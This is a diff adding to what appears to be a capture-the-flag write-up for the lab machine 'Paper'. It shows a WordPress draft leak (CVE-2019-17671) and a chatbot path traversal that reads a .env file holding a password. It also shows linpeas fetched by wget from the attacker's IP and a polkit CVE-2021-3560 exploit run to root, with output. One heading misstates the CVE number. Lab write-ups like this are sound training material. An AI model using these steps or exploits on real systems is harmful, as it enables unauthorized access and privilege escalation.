@@ -258,3 +258,355 @@ This vuln talks about view private/draft posts.
 
 
 # Foothold
+
+## CVE-2019-17671
+
+https://www.exploit-db.com/exploits/47690
+
+```md
+So far we know that adding `?static=1` to a wordpress URL should leak its secret content
+
+Here are a few ways to manipulate the returned entries:
+
+- `order` with `asc` or `desc`
+- `orderby`
+- `m` with `m=YYYY`, `m=YYYYMM` or `m=YYYYMMDD` date format
+
+
+In this case, simply reversing the order of the returned elements suffices and `http://wordpress.local/?static=1&order=asc` will show the secret content:
+```
+
+## http://office.paper/?static=1
+
+```md
+test
+
+Micheal please remove the secret from drafts for gods sake!
+
+Hello employees of Blunder Tiffin,
+
+Due to the orders from higher officials, every employee who were added to this blog is removed and they are migrated to our new chat system.
+
+So, I kindly request you all to take your discussions from the public blog to a more private chat system.
+
+-Nick
+
+# Warning for Michael
+
+Michael, you have to stop putting secrets in the drafts. It is a huge security issue and you have to stop doing it. -Nick
+
+Threat Level Midnight
+
+A MOTION PICTURE SCREENPLAY,  
+WRITTEN AND DIRECTED BY  
+MICHAEL SCOTT
+
+[INT:DAY]
+
+Inside the FBI, Agent Michael Scarn sits with his feet up on his desk. His robotic butler Dwigt….
+
+# Secret Registration URL of new Employee chat system
+
+http://chat.office.paper/register/8qozr226AhkCHZdyY
+
+# I am keeping this draft unpublished, as unpublished drafts cannot be accessed by outsiders. I am not that ignorant, Nick.
+
+# Also, stop looking at my drafts. Jeez!
+```
+
+## registration
+
+register as a user and then check general channel
+![[Pasted image 20230218123614.png]]
+
+```
+kellylikescupcakes Hello. I am Recyclops. A bot assigned by Dwight. I will have my revenge on earthlings, but before that, I have to help my Cool friend Dwight to respond to the annoying questions asked by his co-workers, so that he may use his valuable time to... well, not interact with his co-workers.
+
+-   Most frequently asked questions include:
+    
+-   - What time is it?
+    
+-   - What new files are in your sales directory?
+    
+-   - Why did the salesman crossed the road?
+    
+-   - What's the content of file x in your sales directory? etc.
+    
+
+-   Please note that I am a beta version and I still have some bugs to be fixed.
+    
+
+-   How to use me ? :
+    
+-   1. Small Talk:
+    
+-   You can ask me how dwight's weekend was, or did he watched the game last night etc.
+    
+-   eg: 'recyclops how was your weekend?' or 'recyclops did you watched the game last night?' or 'recyclops what kind of bear is the best?
+    
+
+-   2. Joke:
+    
+-   You can ask me Why the salesman crossed the road.
+    
+-   eg: 'recyclops why did the salesman crossed the road?'
+    
+
+-   <=====The following two features are for those boneheads, who still don't know how to use scp. I'm Looking at you Kevin.=====>
+    
+
+-   For security reasons, the access is limited to the Sales folder.
+    
+
+-   3. Files:
+    
+-   eg: 'recyclops get me the file test.txt', or 'recyclops could you send me the file src/test.php' or just 'recyclops file test.txt'
+    
+
+-   4. List:
+    
+-   You can ask me to list the files
+    
+
+-   5. Time:
+    
+-   You can ask me to what the time is
+    
+-   eg: 'recyclops what time is it?' or just 'recyclops time'
+```
+
+## Recyclops
+
+![[Pasted image 20230218123815.png]]
+
+## hubot/.env file
+
+```
+total 184  
+drwx------ 8 dwight dwight 4096 Sep 16 2021 .  
+drwx------ 11 dwight dwight 281 Feb 6 2022 ..  
+-rw-r--r-- 1 dwight dwight 0 Jul 3 2021 \  
+srwxr-xr-x 1 dwight dwight 0 Jul 3 2021 127.0.0.1:8000  
+srwxrwxr-x 1 dwight dwight 0 Jul 3 2021 127.0.0.1:8080  
+drwx--x--x 2 dwight dwight 36 Sep 16 2021 bin  
+-rw-r--r-- 1 dwight dwight 258 Sep 16 2021 .env  
+-rwxr-xr-x 1 dwight dwight 2 Jul 3 2021 external-scripts.json  
+drwx------ 8 dwight dwight 163 Jul 3 2021 .git  
+-rw-r--r-- 1 dwight dwight 917 Jul 3 2021 .gitignore  
+-rw-r--r-- 1 dwight dwight 66960 Feb 17 22:39 .hubot.log  
+-rwxr-xr-x 1 dwight dwight 1068 Jul 3 2021 LICENSE  
+drwxr-xr-x 89 dwight dwight 4096 Jul 3 2021 node_modules  
+drwx--x--x 115 dwight dwight 4096 Jul 3 2021 node_modules_bak  
+-rwxr-xr-x 1 dwight dwight 1062 Sep 16 2021 package.json  
+-rwxr-xr-x 1 dwight dwight 972 Sep 16 2021 package.json.bak  
+-rwxr-xr-x 1 dwight dwight 30382 Jul 3 2021 package-lock.json  
+-rwxr-xr-x 1 dwight dwight 14 Jul 3 2021 Procfile  
+-rwxr-xr-x 1 dwight dwight 5044 Jul 3 2021 [README.md](http://README.md)  
+drwx--x--x 2 dwight dwight 193 Jan 13 2022 scripts  
+-rwxr-xr-x 1 dwight dwight 100 Jul 3 2021 start_[bot.sh](http://bot.sh)  
+drwx------ 2 dwight dwight 25 Jul 3 2021 .vscode  
+-rwxr-xr-x 1 dwight dwight 29951 Jul 3 2021 yarn.lock
+```
+
+```
+file ../hubot/.env
+
+-   <!=====Contents of file ../hubot/.env=====>
+    
+-   export ROCKETCHAT_URL='[http://127.0.0.1:48320](http://127.0.0.1:48320)'  
+    export ROCKETCHAT_USER=recyclops  
+    export ROCKETCHAT_PASSWORD=Queenofblad3s!23  
+    export ROCKETCHAT_USESSL=false  
+    export RESPOND_TO_DM=true  
+    export RESPOND_TO_EDITED=true  
+    export PORT=8000  
+    export BIND_ADDRESS=127.0.0.1
+    
+-   <!=====End of file ../hubot/.env=====>
+```
+
+the owner of the file is dwight
+
+## ssh login
+
+I first tried with recyclops, but I could not login
+
+as dwight i could login
+
+```
+ssh dwight@paper.htb
+dwight@paper.htb's password: 
+Activate the web console with: systemctl enable --now cockpit.socket
+
+Last failed login: Fri Feb 17 22:43:38 EST 2023 from 10.10.14.44 on ssh:notty
+There was 1 failed login attempt since the last successful login.
+Last login: Tue Feb  1 09:14:33 2022 from 10.10.14.23
+[dwight@paper ~]$ 
+
+```
+
+# Privilege escalation
+## Enumeration
+
+### sudo -l
+`Sorry, user dwight may not run sudo on paper.`
+
+## linpeas
+
+setup a server in `/usr/share/peass/linpeas`
+`python -m http.server 8080`
+
+on dwight machine 
+`wget http://10.10.14.44:8080/linpeas.sh`
+`chmod +x linpeas.sh`
+
+#### Collect CVEs
+
+```shell
+╔══════════╣ CVEs Check
+Potentially Vulnerable to CVE-2022-2588       
+```
+
+```shell
+╔══════════╣ Executing Linux Exploit Suggester
+╚ https://github.com/mzet-/linux-exploit-suggester                                                                                                                                                            
+[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)                                                                                                                                                          
+
+   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
+https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
+   Exposure: less probable
+   Tags: ubuntu=(22.04){kernel:5.15.0-27-generic}
+   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
+   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)
+
+[+] [CVE-2022-2586] nft_object UAF
+
+   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
+   Exposure: less probable
+   Tags: ubuntu=(20.04){kernel:5.12.13}
+   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
+   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)
+
+[+] [CVE-2021-4034] PwnKit
+
+   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
+   Exposure: less probable
+   Tags: ubuntu=10|11|12|13|14|15|16|17|18|19|20|21,debian=7|8|9|10|11,fedora,manjaro
+   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main
+
+[+] [CVE-2021-3156] sudo Baron Samedit
+
+   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
+   Exposure: less probable
+   Tags: mint=19,ubuntu=18|20, debian=10
+   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main
+
+[+] [CVE-2021-3156] sudo Baron Samedit 2
+
+   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
+   Exposure: less probable
+   Tags: centos=6|7|8,ubuntu=14|16|17|18|19|20, debian=9|10
+   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main
+
+[+] [CVE-2021-22555] Netfilter heap out-of-bounds write
+
+   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
+   Exposure: less probable
+   Tags: ubuntu=20.04{kernel:5.8.0-*}
+   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
+   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
+   Comments: ip_tables kernel module must be loaded
+
+[+] [CVE-2019-18634] sudo pwfeedback
+
+   Details: https://dylankatz.com/Analysis-of-CVE-2019-18634/
+   Exposure: less probable
+   Tags: mint=19
+   Download URL: https://github.com/saleemrashid/sudo-cve-2019-18634/raw/master/exploit.c
+   Comments: sudo configuration requires pwfeedback to be enabled.
+
+[+] [CVE-2019-15666] XFRM_UAF
+
+   Details: https://duasynt.com/blog/ubuntu-centos-redhat-privesc
+   Exposure: less probable
+   Download URL: 
+   Comments: CONFIG_USER_NS needs to be enabled; CONFIG_XFRM needs to be enabled
+
+[+] [CVE-2019-13272] PTRACE_TRACEME
+
+   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1903
+   Exposure: less probable
+   Tags: ubuntu=16.04{kernel:4.15.0-*},ubuntu=18.04{kernel:4.15.0-*},debian=9{kernel:4.9.0-*},debian=10{kernel:4.19.0-*},fedora=30{kernel:5.0.9-*}
+   Download URL: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/47133.zip
+   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2019-13272/poc.c
+   Comments: Requires an active PolKit agent.
+
+```
+
+I was not really able to understand the CVEs above so I watched ippsec's video.
+https://www.youtube.com/watch?v=4e4wKDrANog
+
+### dwight -> secnigma -> root
+#### CVE-2021-3650
+https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation
+
+get it from kali machine and run it
+```shell
+[dwight@paper ~]$ ./poc.sh
+
+[!] Username set as : secnigma
+[!] No Custom Timing specified.
+[!] Timing will be detected Automatically
+[!] Force flag not set.
+[!] Vulnerability checking is ENABLED!
+[!] Starting Vulnerability Checks...
+[!] Checking distribution...
+[!] Detected Linux distribution as "centos"
+[!] Checking if Accountsservice and Gnome-Control-Center is installed
+[+] Accounts service and Gnome-Control-Center Installation Found!!
+[!] Checking if polkit version is vulnerable
+[+] Polkit version appears to be vulnerable!!
+[!] Starting exploit...
+[!] Inserting Username secnigma...
+Error org.freedesktop.Accounts.Error.PermissionDenied: Authentication is required
+[+] Inserted Username secnigma  with UID 1005!
+[!] Inserting password hash...
+[!] It looks like the password insertion was succesful!
+[!] Try to login as the injected user using su - secnigma
+[!] When prompted for password, enter your password 
+[!] If the username is inserted, but the login fails; try running the exploit again.
+[!] If the login was succesful,simply enter 'sudo bash' and drop into a root shell!
+```
+we might need to try it several times
+```
+cat /etc/passwd
+
+nginx:x:977:975:Nginx web server:/var/lib/nginx:/sbin/nologin
+mongod:x:976:974:mongod:/var/lib/mongo:/bin/false
+rocketchat:x:1001:1001::/home/rocketchat:/bin/bash
+dwight:x:1004:1004::/home/dwight:/bin/bash
+secnigma:x:1005:1005:secnigma:/home/secnigma:/bin/bash
+```
+#### dwight -> secnigma
+su secnigma: secnigmaftw (README.md has the password)
+```
+[dwight@paper ~]$ su secnigma
+Password: 
+[secnigma@paper dwight]$ whoami
+secnigma
+```
+
+#### secnigma -> root
+```
+[secnigma@paper dwight]$ sudo bash
+[sudo] password for secnigma: 
+[root@paper dwight]# whoami
+root
+```
+then `sudo bash`
+
+#### Rootflag
+```
+cd ~
+cat root.txt
+```
